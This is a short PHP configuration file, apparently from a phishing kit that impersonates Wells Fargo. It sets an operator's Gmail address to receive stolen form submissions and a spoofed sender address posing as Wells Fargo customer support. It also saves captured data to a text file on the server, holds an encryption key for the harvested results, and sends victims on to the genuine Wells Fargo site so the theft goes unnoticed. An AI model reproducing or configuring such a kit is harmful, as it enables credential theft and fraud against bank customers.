<?php
$Your_Email = "DAUCUFURKA@GMAIL.COM";  // Set your email 
$From_Address = "outgoing@customer-support-wellsfargo.com";  // Address your results will apear to come from
$Send_Log=1;  // Sends results to above email
$Save_Log=1;  // Saves results to server within a txt file
$Abuse_Filter=0; // Block  abusive form filing 
$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending fake forms
$Encrypt=0; // Encrypt: This feature encrypts your results
$Key = 	"oL^11tj)1#B)Bh_1y0e.e252OT1ceZ"; // This key is used to decrypt results and can be changed
$ExitLink = "https://www.wellsfargo.com/privacy-security/fraud/articles/mobile-security/"; // Real site via google redirect
?>
